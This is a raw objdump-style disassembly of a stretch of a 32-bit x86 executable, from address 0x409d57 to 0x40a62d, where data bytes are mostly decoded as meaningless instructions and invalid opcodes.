  409d57:	add    bh,bh
  409d59:	(bad)  
  409d5a:	cld    
  409d5b:	add    BYTE PTR [edi],bh
  409d5d:	inc    DWORD PTR [eax]
  409d5f:	add    bh,bh
  409d61:	(bad)  
  409d62:	cld    
  409d63:	add    BYTE PTR [edi-0x1],bh
  409d66:	add    BYTE PTR [eax],al
  409d68:	(bad)  
  409d69:	(bad)  
  409d6a:	cld    
  409d6b:	add    bh,bh
  409d6d:	inc    DWORD PTR [eax]
  409d6f:	add    bh,bh
  409d71:	(bad)  
  409d72:	cld    
  409d73:	add    edi,edi
  409d75:	inc    DWORD PTR [eax]
  409d77:	add    dh,bh
  409d79:	pop    es
  409d7a:	cld    
  409d7b:	add    BYTE PTR [eax],al
  409d7d:	add    DWORD PTR [eax],eax
  409d7f:	add    al,bh
  409d81:	add    esp,edi
  409d83:	add    BYTE PTR [eax],al
  409d85:	add    DWORD PTR [eax],eax
  409d87:	add    al,dh
  409d89:	add    ah,bh
  409d8b:	add    BYTE PTR [eax],al
  409d8d:	add    DWORD PTR [eax],eax
  409d8f:	add    al,ah
  409d91:	add    BYTE PTR [eax+eax*1+0x0],bh
  409d95:	add    DWORD PTR [eax],eax
  409d97:	add    al,al
  409d99:	add    BYTE PTR [eax+eax*1],bh
  409d9c:	add    BYTE PTR [ecx],al
  409d9e:	add    BYTE PTR [eax],al
  409da0:	rol    BYTE PTR [eax],0x3c
  409da3:	add    BYTE PTR [eax],al
  409da5:	add    DWORD PTR [eax],eax
  409da7:	add    BYTE PTR [eax+0x1c00],al
  409dad:	add    DWORD PTR [eax],eax
  409daf:	add    BYTE PTR [eax+0x1c00],al
  409db5:	add    DWORD PTR [eax],eax
  409db7:	add    BYTE PTR [eax+0x1c00],al
  409dbd:	add    DWORD PTR [eax],eax
  409dbf:	add    BYTE PTR [eax+0x1c00],al
  409dc5:	add    DWORD PTR [eax],eax
  409dc7:	add    BYTE PTR [eax+0x1c00],al
  409dcd:	add    DWORD PTR [eax],eax
  409dcf:	add    BYTE PTR [eax+0x1c00],al
  409dd5:	add    DWORD PTR [eax],eax
  409dd7:	add    al,al
  409dd9:	add    BYTE PTR [eax+eax*1],bh
  409ddc:	add    BYTE PTR [ecx],al
  409dde:	add    BYTE PTR [eax],al
  409de0:	rol    BYTE PTR [eax],0x3c
  409de3:	add    BYTE PTR [eax],al
  409de5:	add    DWORD PTR [eax],eax
  409de7:	add    al,ah
  409de9:	add    BYTE PTR [eax+eax*1+0x0],bh
  409ded:	add    DWORD PTR [eax],eax
  409def:	add    al,dh
  409df1:	add    ah,bh
  409df3:	add    BYTE PTR [eax],al
  409df5:	add    DWORD PTR [eax],eax
  409df7:	add    al,bh
  409df9:	add    esp,edi
  409dfb:	add    BYTE PTR [eax],al
  409dfd:	add    DWORD PTR [eax],eax
  409dff:	add    dh,bh
  409e01:	pop    es
  409e02:	cld    
  409e03:	add    BYTE PTR [eax],al
  409e05:	add    DWORD PTR [eax],eax
  409e07:	add    bh,bh
  409e09:	(bad)  
  409e0a:	(bad)  
  409e0b:	(bad)  
  409e0c:	(bad)  
  409e0d:	inc    DWORD PTR [eax]
  409e0f:	add    BYTE PTR [eax],ch
  409e11:	add    BYTE PTR [eax],al
  409e13:	add    BYTE PTR [eax],ch
  409e15:	add    BYTE PTR [eax],al
  409e17:	add    BYTE PTR [eax+0x0],dl
  409e1a:	add    BYTE PTR [eax],al
  409e1c:	add    DWORD PTR [eax],eax
  409e1e:	or     BYTE PTR [eax],al
  409e20:	add    BYTE PTR [eax],al
  409e22:	add    BYTE PTR [eax],al
  409e24:	inc    eax
  409e25:	push   es
	...
  409e2e:	add    BYTE PTR [eax],al
  409e30:	add    BYTE PTR [ecx],al
  409e32:	add    BYTE PTR [eax],al
  409e34:	add    BYTE PTR [ecx],al
  409e36:	add    BYTE PTR [eax],al
  409e38:	add    BYTE PTR [eax],al
  409e3a:	add    BYTE PTR [eax],al
  409e3c:	mov    fs,WORD PTR [ebx+0x34]
  409e3f:	add    BYTE PTR [ebp-0x66ffbd91],dl
  409e45:	outs   dx,DWORD PTR ds:[esi]
  409e46:	inc    ebx
  409e47:	add    BYTE PTR [ebp-0x62ffbe8d],bl
  409e4d:	je     0x409e94
  409e4f:	add    BYTE PTR [edi-0x66ffb78e],dl
  409e55:	jae    0x409ea0
  409e57:	add    BYTE PTR [edi-0x64ffb288],bl
  409e5d:	js     0x409eaf
  409e5f:	add    BYTE PTR [ecx+edi*2+0x7c9e0051],bl
  409e66:	push   ebp
  409e67:	add    BYTE PTR [ebx+edi*2+0x7ba00053],ah
  409e6e:	push   esp
  409e6f:	add    BYTE PTR [ebx-0x5affab82],ah
  409e75:	jge    0x409ecb
  409e77:	add    BYTE PTR [ecx-0x5bffa781],ah
  409e7d:	jg     0x409ed7
  409e7f:	add    BYTE PTR [ebx],bl
  409e81:	sahf   
  409e82:	pop    ds
  409e83:	add    BYTE PTR [esi],bl
  409e85:	pushf  
  409e86:	and    DWORD PTR [eax],eax
  409e88:	sub    DWORD PTR [ebp+ebp*1+0x34ae3000],ebp
  409e8f:	add    BYTE PTR [ecx],bh
  409e91:	mov    esp,0xb968003d
  409e96:	push   0x0
  409e98:	jae    0x409e59
  409e9a:	je     0x409e9c
  409e9c:	inc    esi
  409e9d:	retf   0x4a
  409ea0:	dec    esi
  409ea1:	rcl    BYTE PTR [edx+0x0],cl
  409ea4:	push   eax
  409ea5:	aam    0x54
  409ea7:	add    BYTE PTR [ecx-0x2b],bl
  409eaa:	pop    ebp
  409eab:	add    BYTE PTR [esi-0x3a],bl
  409eae:	bound  eax,QWORD PTR [eax]
  409eb0:	popa   
  409eb1:	(bad)  
  409eb2:	add    BYTE PTR gs:[ecx-0x28],dh
  409eb6:	jne    0x409eb8
  409eb8:	jnp    0x409e93
  409eba:	jg     0x409ebc
  409ebc:	scas   al,BYTE PTR es:[edi]
  409ebd:	or     DWORD PTR [ebx+0x0],0x5483aa
  409ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec5:	sbb    DWORD PTR [ecx+0x0],0x5c83a6
  409ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ecd:	test   BYTE PTR [edi+0x0],bl
  409ed0:	stos   BYTE PTR es:[edi],al
  409ed1:	xchg   DWORD PTR [ebp+0x0],ebx
  409ed4:	lods   al,BYTE PTR ds:[esi]
  409ed5:	mov    BYTE PTR [eax+eax*1-0x4d],bl
  409ed9:	xchg   DWORD PTR [ebx+0x0],edx
  409edc:	mov    bl,0x8b
  409ede:	push   esi
  409edf:	add    BYTE PTR [ebx-0x4affa375],dh
  409ee5:	nop
  409ee6:	pop    ebp
  409ee7:	add    BYTE PTR [edi-0x59ff9e7b],ah
  409eed:	mov    DWORD PTR [esi+0x0],esp
  409ef0:	test   al,0x88
  409ef2:	bound  eax,QWORD PTR [eax]
  409ef4:	lods   al,BYTE PTR ds:[esi]
  409ef5:	mov    BYTE PTR [ebx+0x0],ah
  409ef8:	stos   BYTE PTR es:[edi],al
  409ef9:	mov    BYTE PTR [eax+eax*1-0x56],ah
  409efd:	lea    ebp,[ebx+0x0]
  409f00:	lods   al,BYTE PTR ds:[esi]
  409f01:	lea    ebp,[edx+0x0]
  409f04:	stos   DWORD PTR es:[edi],eax
  409f05:	mov    gs,WORD PTR [esi+0x0]
  409f08:	mov    dl,0x8e
  409f0a:	bound  eax,QWORD PTR [eax]
  409f0c:	mov    dh,0x8f
  409f0e:	pusha  
  409f0f:	add    BYTE PTR [ebx-0x51ff9673],dh
  409f15:	nop
  409f16:	ins    DWORD PTR es:[edi],dx
  409f17:	add    BYTE PTR [esi-0x4cff9d70],dh
  409f1d:	nop
  409f1e:	add    BYTE PTR [bx+0x6592],dh
  409f23:	add    BYTE PTR [ecx-0x4cff986c],bh
  409f29:	xchg   ecx,eax
  409f2a:	push   0x6f92b200
  409f2f:	add    BYTE PTR [esi-0x4aff906e],dh
  409f35:	xchg   ebp,eax
  409f36:	outs   dx,DWORD PTR ds:[esi]
  409f37:	add    BYTE PTR [ecx-0x43ff916f],bh
  409f3d:	cdq    
  409f3e:	ins    DWORD PTR es:[edi],dx
  409f3f:	add    BYTE PTR [edx-0x48ff8c6d],dh
  409f45:	xchg   ebx,eax
  409f46:	jno    0x409f48
  409f48:	mov    cl,0x94
  409f4a:	jae    0x409f4c
  409f4c:	mov    bh,0x97
  409f4e:	jb     0x409f50
  409f50:	mov    al,0x96
  409f52:	jbe    0x409f54
  409f54:	mov    ch,0x96
  409f56:	je     0x409f58
  409f58:	mov    esp,0xb6007396
  409f5d:	call   0x70:0x99ba0076
  409f64:	mov    esp,0xbe00729b
  409f69:	popf   
  409f6a:	ja     0x409f6c
  409f6c:	mov    ch,0x9e
  409f6e:	js     0x409f70
  409f70:	mov    dh,0x9b
  409f72:	jge    0x409f74
  409f74:	mov    bh,0x9d
  409f76:	jle    0x409f78
  409f78:	mov    ebx,0xba007b9b
  409f7d:	sahf   
  409f7e:	jp     0x409f80
  409f80:	mov    esi,0xb900789f
  409f85:	pushf  
  409f86:	jle    0x409f88
  409f88:	mov    esp,0xc0007ca1
  409f8d:	call   0x70:0x9cc0006e
  409f94:	rcr    BYTE PTR [esi-0x633fff8b],0x7c
  409f9b:	add    ah,al
  409f9d:	lahf   
  409f9e:	jg     0x409fa0
  409fa0:	ret    
  409fa1:	mov    eax,ds:0xa4c00078
  409fa6:	jl     0x409fa8
  409fa8:	mov    ebp,0xb700829f
  409fad:	mov    al,ds:0xa1bd0084
  409fb2:	add    DWORD PTR [eax],0xffffffb9
  409fb5:	mov    eax,ds:0xa2bd0085
  409fba:	xchg   BYTE PTR [eax],al
  409fbc:	mov    ebp,0xbe0087a4
  409fc1:	stos   BYTE PTR es:[edi],al
  409fc2:	add    DWORD PTR [eax],0xffffffbc
  409fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fc6:	mov    DWORD PTR [eax],eax
  409fc8:	mov    edx,0xbe008fa4
  409fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fce:	lea    eax,[eax]
  409fd0:	mov    edi,0xba008fa8
  409fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd6:	xchg   ecx,eax
  409fd7:	add    BYTE PTR [esi-0x42ff6b58],bh
  409fdd:	mov    cl,0xad
  409fdf:	add    BYTE PTR [esi-0x39ff4e4d],bh
  409fe5:	mov    al,ds:0xa2c80081
  409fea:	add    BYTE PTR [eax],0xca
  409fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fee:	xchg   DWORD PTR [eax],eax
  409ff0:	shr    DWORD PTR [ecx-0x593fff7d],0x8a
  409ff7:	add    al,al
  409ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ffa:	mov    WORD PTR [eax],es
  409ffc:	enter  0x89a5,0x0
  40a000:	les    ebp,FWORD PTR [edx-0x563eff77]
  40a006:	lea    eax,[eax]
  40a008:	retf   
  40a009:	test   al,0x8a
  40a00b:	add    ah,cl
  40a00d:	stos   BYTE PTR es:[edi],al
  40a00e:	mov    es,WORD PTR [eax]
  40a010:	retf   
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	pop    DWORD PTR [eax]
  40a014:	ret    0x91ab
  40a017:	add    ah,al
  40a019:	lods   al,BYTE PTR ds:[esi]
  40a01a:	xchg   edx,eax
  40a01b:	add    cl,al
  40a01d:	stos   DWORD PTR es:[edi],eax
  40a01e:	xchg   esi,eax
  40a01f:	add    bl,al
  40a021:	lods   eax,DWORD PTR ds:[esi]
  40a022:	xchg   ebp,eax
  40a023:	add    ch,al
  40a025:	scas   eax,DWORD PTR es:[edi]
  40a026:	xchg   esi,eax
  40a027:	add    bl,cl
  40a029:	lods   eax,DWORD PTR ds:[esi]
  40a02a:	xchg   edx,eax
  40a02b:	add    dh,cl
  40a02d:	lods   al,BYTE PTR ds:[esi]
  40a02e:	xchg   ecx,eax
  40a02f:	add    dl,cl
  40a031:	scas   eax,DWORD PTR es:[edi]
  40a032:	xchg   esi,eax
  40a033:	add    bh,cl
  40a035:	scas   eax,DWORD PTR es:[edi]
  40a036:	xchg   ebp,eax
  40a037:	add    bl,al
  40a039:	scas   eax,DWORD PTR es:[edi]
  40a03a:	cwde   
  40a03b:	add    dh,al
  40a03d:	mov    cl,0x95
  40a03f:	add    bl,al
  40a041:	mov    al,0x9a
  40a043:	add    ch,al
  40a045:	mov    cl,0x9a
  40a047:	add    dh,al
  40a049:	mov    cl,0x9c
  40a04b:	add    dh,al
  40a04d:	mov    ah,0x9f
  40a04f:	add    al,cl
  40a051:	mov    cl,0x9a
  40a053:	add    ch,cl
  40a055:	mov    bl,0x9b
  40a057:	add    bl,cl
  40a059:	mov    ch,0x9b
  40a05b:	add    al,cl
  40a05d:	mov    bl,0x9c
  40a05f:	add    al,cl
  40a061:	mov    ah,0x9d
  40a063:	add    ch,cl
  40a065:	mov    ch,0x9e
  40a067:	add    bh,cl
  40a069:	mov    edx,0xb1d0009f
  40a06e:	xchg   edi,eax
  40a06f:	add    bl,dl
  40a071:	mov    ah,0x9b
  40a073:	add    ch,al
  40a075:	mov    ah,0xa5
  40a077:	add    dl,cl
  40a079:	mov    dh,0xa1
  40a07b:	add    bl,cl
  40a07d:	mov    eax,0xb9cd00a2
  40a082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a083:	add    dh,cl
  40a085:	mov    esp,0xbccd00a5
  40a08a:	test   eax,0xa0b7d000
  40a08f:	add    dl,dl
  40a091:	mov    eax,0xb9d400a1
  40a096:	mov    eax,ds:0xa6bbd200
  40a09b:	add    dh,dl
  40a09d:	mov    edx,0xbcd500a4
  40a0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a3:	add    al,bl
  40a0a5:	mov    ebp,0xbed000a7
  40a0aa:	stos   BYTE PTR es:[edi],al
  40a0ab:	add    ch,dl
  40a0ad:	mov    esi,0xbfd900a9
  40a0b2:	stos   BYTE PTR es:[edi],al
  40a0b3:	add    BYTE PTR [ebx-0x69ff7234],cl
  40a0b9:	into   
  40a0ba:	cwde   
  40a0bb:	add    BYTE PTR [eax-0x48ff5b22],ah
  40a0c1:	loopne 0x40a07e
  40a0c3:	add    BYTE PTR [ecx-0x35ff4420],bh
  40a0c9:	shr    DWORD PTR [ecx-0x543e3200],0x0
  40a0d0:	into   
  40a0d1:	shr    DWORD PTR [eax+eax*1+0xafc5cd],0xd5
  40a0d9:	shr    DWORD PTR [esi-0x523e2700],0x0
  40a0e0:	leave  
  40a0e1:	sar    BYTE PTR [esi-0x4d3b2e00],0x0
  40a0e8:	fadd   st,st(3)
  40a0ea:	mov    al,0x0
  40a0ec:	fcmovb st,st(4)
  40a0ee:	mov    dl,0x0
  40a0f0:	fadd   st(4),st
  40a0f2:	mov    cl,0x0
  40a0f4:	fld    st(6)
  40a0f6:	mov    dh,0x0
  40a0f8:	ffree  st(6)
  40a0fa:	mov    ah,0x0
  40a0fc:	xlat   BYTE PTR ds:[ebx]
  40a0fd:	enter  0xb7,0xde
  40a101:	enter  0xb5,0xd7
  40a105:	leave  
  40a106:	mov    eax,0xb8c9d900
  40a10b:	add    dh,bl
  40a10d:	retf   0xb9
  40a110:	fcmove st,st(4)
  40a112:	mov    ebp,0xbdcddc00
  40a117:	add    al,ah
  40a119:	int3   
  40a11a:	mov    ebx,0xbdcde100
  40a11f:	add    ch,dl
  40a121:	into   
  40a122:	rol    DWORD PTR [eax],0xda
  40a125:	into   
  40a126:	ret    0xd600
  40a129:	into   
  40a12a:	leave  
  40a12b:	add    dl,bl
  40a12d:	rol    bh,cl
  40a12f:	add    dh,bl
  40a131:	rol    esp,cl
  40a133:	add    al,bl
  40a135:	ror    al,cl
  40a137:	add    cl,bl
  40a139:	aam    0xca
  40a13b:	add    ch,bl
  40a13d:	xlat   BYTE PTR ds:[ebx]
  40a13e:	(bad)  
  40a13f:	add    ch,bl
  40a141:	(bad)  
  40a143:	add    ch,bl
  40a145:	fstp   st(1)
  40a147:	add    dl,ah
  40a149:	iret   
  40a14a:	rol    BYTE PTR [eax],0xe3
  40a14d:	rol    cl,1
  40a14f:	add    ah,ah
  40a151:	rol    bl,cl
  40a153:	add    al,ah
  40a155:	rol    ebp,cl
  40a157:	add    ch,ah
  40a159:	rol    ebp,cl
  40a15b:	add    al,ah
  40a15d:	aam    0xc7
  40a15f:	add    ch,ah
  40a161:	aam    0xc6
  40a163:	add    cl,ah
  40a165:	(bad)  
  40a166:	leave  
  40a167:	add    dh,ah
  40a169:	(bad)  
  40a16a:	enter  0xe000,0xd7
  40a16e:	int3   
  40a16f:	add    bh,ah
  40a171:	fmul   st,st(3)
  40a173:	add    bl,ah
  40a175:	fcmove st,st(7)
  40a177:	add    dh,ah
  40a179:	fxch   st(6)
  40a17b:	add    al,ch
  40a17d:	fcmove st,st(5)
  40a17f:	add    bl,ah
  40a181:	fcmovbe st,st(0)
  40a183:	add    dh,ah
  40a185:	(bad)  
  40a187:	add    dl,ah
  40a189:	(bad)  
  40a18b:	add    dl,ch
  40a18d:	fcmovnbe st,st(0)
  40a18f:	add    dl,ch
  40a191:	fst    st(2)
  40a193:	add    dl,ch
  40a195:	(bad)  
  40a197:	add    ah,ch
  40a199:	(bad)  
  40a19b:	add    ah,ah
  40a19d:	(bad)  
  40a19f:	add    al,al
  40a1a1:	loop   0x40a165
  40a1a3:	add    ch,dl
  40a1a5:	in     eax,0xd9
  40a1a7:	add    bl,bl
  40a1a9:	in     eax,dx
  40a1aa:	fild   DWORD PTR [eax]
  40a1ac:	jmp    0x40a18e
  40a1ae:	xlat   BYTE PTR ds:[ebx]
  40a1af:	add    bl,ah
  40a1b1:	loopne 0x40a18d
  40a1b3:	add    bh,ah
  40a1b5:	loope  0x40a18f
  40a1b7:	add    cl,ah
  40a1b9:	loop   0x40a19a
  40a1bb:	add    ch,ah
  40a1bd:	loop   0x40a19c
  40a1bf:	add    ah,ch
  40a1c1:	jecxz  0x40a19e
  40a1c3:	add    al,dh
  40a1c5:	out    0xde,al
  40a1c7:	add    cl,ah
  40a1c9:	loop   0x40a1ab
  40a1cb:	add    bh,ah
  40a1cd:	jecxz  0x40a1b2
  40a1cf:	add    cl,ah
  40a1d1:	in     al,0xe2
  40a1d3:	add    bh,ah
  40a1d5:	in     al,0xe3
  40a1d7:	add    dl,ah
  40a1d9:	out    0xe5,al
  40a1db:	add    ah,ah
  40a1dd:	out    0xe6,eax
  40a1df:	add    ah,ah
  40a1e1:	call   0xe92ba2cd
  40a1e6:	out    0x0,eax
  40a1e8:	in     eax,0xe9
  40a1ea:	call   0xea2b89ef
  40a1ef:	add    al,ch
  40a1f1:	in     eax,dx
  40a1f2:	jmp    0xea00:0xebeded00
  40a1f9:	in     al,dx
  40a1fa:	in     al,dx
  40a1fb:	add    ah,ch
  40a1fd:	out    dx,al
  40a1fe:	out    dx,al
  40a1ff:	add    cl,dh
  40a201:	jmp    0xe9:0xedf200e3
  40a208:	cmc    
  40a209:	out    dx,eax
  40a20a:	jmp    0xf800:0xedf1f600
  40a211:	repz out dx,eax
  40a213:	add    cl,dh
  40a215:	repnz icebp 
  40a217:	add    bh,dh
  40a219:	repz lock add bl,dh
  40a21d:	hlt    
  40a21e:	repz add bh,dh
  40a221:	cmc    
  40a222:	repz add dh,dh
  40a225:	div    ch
  40a227:	add    cl,bh
  40a229:	hlt    
  40a22a:	repnz add cl,bh
  40a22d:	clc    
  40a22e:	test   DWORD PTR [eax],0xfafafa
  40a234:	(bad)  
  40a235:	(bad)  
  40a236:	inc    DWORD PTR [eax]
	...
  40a27c:	add    BYTE PTR [ebx],ah
  40a27e:	add    eax,DWORD PTR [ebx]
  40a280:	add    DWORD PTR [eax],eax
	...
  40a2a2:	add    BYTE PTR [eax],al
  40a2a4:	dec    esi
  40a2a5:	dec    eax
  40a2a6:	imul   ebp,DWORD PTR [ebx+0xc],0x0
	...
  40a2ca:	add    BYTE PTR [eax],al
  40a2cc:	xor    BYTE PTR [ecx+0x6c],bl
  40a2cf:	inc    eax
  40a2d0:	popa   
	...
  40a2f1:	add    BYTE PTR [eax],al
  40a2f3:	add    BYTE PTR [esi],dh
  40a2f5:	je     0x40a363
  40a2f7:	add    BYTE PTR ss:[eax],al
	...
  40a306:	cmp    eax,0x7723080c
	...
  40a31b:	or     al,0x71
  40a31d:	je     0x40a378
  40a31f:	dec    esi
	...
  40a32c:	inc    ebp
  40a32d:	es xchg ecx,eax
  40a32f:	shl    esp,cl
  40a331:	mov    esi,0x910b63
	...
  40a342:	xchg   ecx,eax
  40a343:	inc    ebp
  40a344:	jge    0x40a3c3
  40a346:	inc    ebp
	...
  40a353:	cmp    eax,0xfefddf49
  40a358:	(bad)  
  40a359:	(bad)  
  40a35a:	cli    
  40a35b:	mov    dh,0x23
  40a35d:	test   DWORD PTR [eax],eax
  40a35f:	add    BYTE PTR [eax],al
  40a361:	add    BYTE PTR [ebx-0x7b],ah
  40a364:	add    BYTE PTR [eax],al
  40a366:	add    BYTE PTR [eax],al
  40a368:	add    BYTE PTR [eax],al
  40a36a:	or     al,0x7d
  40a36c:	lea    edi,[ebp+0x23]
	...
  40a377:	add    BYTE PTR [eax],al
  40a379:	add    BYTE PTR [ecx+edx*2-0x21],cl
  40a37d:	cli    
  40a37e:	cli    
  40a37f:	(bad)  
  40a380:	(bad)  
  40a381:	(bad)  
  40a382:	(bad)  
  40a383:	(bad)  
  40a384:	rcl    DWORD PTR [eax],cl
  40a386:	mov    al,BYTE PTR [eax]
  40a388:	add    BYTE PTR [eax],al
  40a38a:	arpl   WORD PTR [ebp-0x64],ax
  40a38d:	add    BYTE PTR [eax],al
  40a38f:	add    BYTE PTR [eax],al
  40a391:	popa   
  40a392:	push   ecx
  40a393:	xchg   esi,eax
  40a394:	mov    ?,WORD PTR [eax]
	...
  40a3a2:	xor    al,0xc0
  40a3a4:	icebp  
  40a3a5:	icebp  
  40a3a6:	cli    
  40a3a7:	cli    
  40a3a8:	(bad)  
  40a3a9:	(bad)  
  40a3aa:	(bad)  
  40a3ab:	(bad)  
  40a3ac:	(bad)  
  40a3ad:	mov    dh,0x2
  40a3af:	add    BYTE PTR [eax],al
  40a3b1:	add    BYTE PTR [ebx-0x76],ah
  40a3b4:	jge    0x40a352
  40a3b6:	add    BYTE PTR [eax],al
  40a3b8:	add    BYTE PTR [ecx],cl
  40a3ba:	xchg   esi,eax
  40a3bb:	cdq    
  40a3bc:	cdq    
  40a3bd:	or     DWORD PTR [eax],eax
	...
  40a3c7:	add    BYTE PTR [eax],al
  40a3c9:	push   edi
  40a3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cb:	out    0xea,al
  40a3cd:	in     al,dx
  40a3ce:	icebp  
  40a3cf:	idiv   ebp
  40a3d1:	(bad)  
  40a3d2:	(bad)  
  40a3d3:	(bad)  
  40a3d4:	(bad)  
  40a3d5:	dec    BYTE PTR [edx+0x63000077]
  40a3db:	cdq    
  40a3dc:	mov    ah,0x7d
  40a3de:	stos   DWORD PTR es:[edi],eax
  40a3df:	add    BYTE PTR [ebx],dh
  40a3e1:	je     0x40a381
  40a3e3:	sahf   
  40a3e4:	and    eax,DWORD PTR [eax]
	...
  40a3ee:	add    BYTE PTR [eax],al
  40a3f0:	add    BYTE PTR [ebx],bh
  40a3f2:	shr    dl,0xe6
  40a3f5:	in     al,dx
  40a3f6:	in     al,dx
  40a3f7:	icebp  
  40a3f8:	idiv   esi
  40a3fa:	(bad)  
  40a3fb:	(bad)  
  40a3fc:	(bad)  
  40a3fd:	(bad)  
  40a3fe:	loope  0x40a445
  40a400:	add    BYTE PTR [eax],al
  40a402:	cwd    
  40a404:	mov    dh,0xb6
  40a406:	lea    esi,[ebx-0x754f4faf]
  40a40c:	jo     0x40a40e
	...
  40a416:	add    BYTE PTR [eax],al
  40a418:	add    BYTE PTR [edx],bh
  40a41a:	ret    
  40a41b:	out    0xec,al
  40a41d:	jmp    0xfefb:0xfaf7ecec
  40a424:	(bad)  
  40a425:	(bad)  
  40a426:	icebp  
  40a427:	xor    BYTE PTR [eax],al
  40a429:	add    BYTE PTR [esi-0x63],ah
  40a42c:	lds    edi,FWORD PTR [ecx-0x4f4f7547]
  40a432:	mov    al,0x51
	...
  40a440:	add    BYTE PTR [ebx],bh
  40a442:	shr    ah,0xea
  40a445:	jmp    0xfef7:0xf7ececea
  40a44c:	(bad)  
  40a44d:	dec    bh
  40a44f:	inc    ebp
  40a450:	add    BYTE PTR [eax],al
  40a452:	ja     0x40a3fc
  40a454:	retf   0xb9ca
  40a457:	retf   0xb2b9
  40a45a:	mov    ecx,0x9599615c
  40a45f:	mov    dl,BYTE PTR [esi+0x8a738a]
  40a465:	add    BYTE PTR [eax],al
  40a467:	add    BYTE PTR [eax],al
  40a469:	push   edi
  40a46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a46b:	out    0xea,al
  40a46d:	jmp    0xfaf7:0xececeaea
  40a474:	std    
  40a475:	(bad)  
  40a476:	pushf  
  40a477:	ja     0x40a479
  40a479:	add    BYTE PTR [edi-0x50],dh
  40a47c:	retf   0xcaca
  40a47f:	retf   0xc5b9
  40a482:	mov    ecx,0x999d9db0
  40a487:	cdq    
  40a488:	cdq    
  40a489:	cdq    
  40a48a:	or     al,0x0
  40a48c:	add    BYTE PTR [eax],al
  40a48e:	add    BYTE PTR [eax],al
  40a490:	add    BYTE PTR [eax],al
  40a492:	cmp    al,al
  40a494:	out    0xea,al
  40a496:	call   0xed2d8d85
  40a49b:	icebp  
  40a49c:	div    DWORD PTR [ebx+0x5]
  40a4a2:	ja     0x40a453
  40a4a4:	(bad)  
  40a4a5:	aad    0xce
  40a4a7:	int3   
  40a4a8:	retf   0xc5cc
  40a4ab:	retf   0xb9b9
  40a4ae:	mov    ecx,0x619eb6
  40a4b3:	add    BYTE PTR [eax],al
  40a4b5:	add    BYTE PTR [eax],al
  40a4b7:	add    BYTE PTR [eax],al
  40a4b9:	add    BYTE PTR [edx+0x51],bl
  40a4bc:	ret    
  40a4bd:	out    0xea,al
  40a4bf:	call   0xed2d8bae
  40a4c4:	shl    BYTE PTR [ebx],0x8a
  40a4c7:	add    BYTE PTR [eax],al
  40a4c9:	add    BYTE PTR [ebp-0x2929294a],al
  40a4cf:	aad    0xd5
  40a4d1:	retf   0xcaca
  40a4d4:	retf   0xb9ca
  40a4d7:	sahf   
  40a4d8:	ja     0x40a4da
	...
  40a4e2:	add    BYTE PTR [ebp+0x4c],dl
  40a4e5:	shr    dl,0xea
  40a4e8:	jmp    0x8a:0x26abe6ea
  40a4ef:	add    BYTE PTR [eax],al
  40a4f1:	add    BYTE PTR [edi-0x42],dh
  40a4f4:	loope  0x40a4ce
  40a4f6:	(bad)  
  40a4f7:	(bad)  
  40a4f8:	(bad)  
  40a4f9:	aad    0xd5
  40a4fb:	retf   0xcaca
  40a4fe:	mov    dh,0x8a
	...
  40a50c:	push   ebp
  40a50d:	sub    bh,BYTE PTR [ebx-0x44]
  40a510:	ret    
  40a511:	stos   DWORD PTR es:[edi],eax
  40a512:	popa   
  40a513:	and    cl,BYTE PTR [eax+eax*1+0x0]
  40a51a:	test   edx,ecx
  40a51c:	jecxz  0x40a501
  40a51e:	jecxz  0x40a4f8
  40a520:	fcomp  st(0)
  40a522:	(bad)  
  40a523:	(bad)  
  40a524:	aad    0xcc
  40a526:	jo     0x40a528
	...
  40a534:	add    BYTE PTR [eax],al
  40a536:	push   ebp
  40a537:	sub    BYTE PTR [ecx],ah
  40a539:	sub    dh,BYTE PTR [eax+eax*1+0x0]
  40a53d:	add    BYTE PTR [eax],al
  40a53f:	add    BYTE PTR [eax],al
  40a541:	add    BYTE PTR [edi-0x34],dh
  40a544:	repnz jecxz 0x40a52a
  40a547:	jecxz  0x40a52a
  40a549:	jecxz  0x40a523
  40a54b:	(bad)  
  40a54c:	(bad)  
  40a54d:	push   ecx
	...
  40a56a:	test   eax,eax
  40a56c:	jecxz  0x40a551
  40a56e:	jecxz  0x40a553
  40a570:	jecxz  0x40a555
  40a572:	loope  0x40a549
  40a574:	jo     0x40a576
	...
  40a592:	test   esi,edx
  40a594:	cld    
  40a595:	hlt    
  40a596:	hlt    
  40a597:	hlt    
  40a598:	jecxz  0x40a57d
  40a59a:	(bad)  
  40a59b:	mov    al,BYTE PTR [eax]
	...
  40a5b9:	add    BYTE PTR [ebp-0x9030331],al
  40a5bf:	div    ah
  40a5c1:	loope  0x40a55c
	...
  40a5df:	add    BYTE PTR [eax],al
  40a5e1:	add    BYTE PTR [edi-0x1f],dh
  40a5e4:	div    dh
  40a5e6:	div    dh
  40a5e8:	div    BYTE PTR [edi+0x0]
	...
  40a5fb:	add    BYTE PTR [eax],al
  40a5fd:	add    BYTE PTR [ebx+0x37],dh
  40a600:	xor    BYTE PTR [esi+eiz*4+0x0],al
  40a604:	add    BYTE PTR [eax],al
  40a606:	add    BYTE PTR [eax],al
  40a608:	add    BYTE PTR [eax],al
  40a60a:	test   esi,edx
  40a60c:	(bad)  
  40a60d:	cld    
  40a60e:	cld    
  40a60f:	cld    
  40a610:	inc    esi
  40a611:	xor    ecx,DWORD PTR [edx-0x75757576]
  40a617:	mov    cl,BYTE PTR [edx+0x7d858a8a]
  40a61d:	test   DWORD PTR [ebp+0x0],eax
  40a623:	add    BYTE PTR [ecx+0x5],dl
  40a626:	popa   
  40a627:	mov    bl,0xc2
  40a629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a62a:	xor    eax,DWORD PTR [esi]
  40a62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a62d:	add    BYTE PTR [eax],al
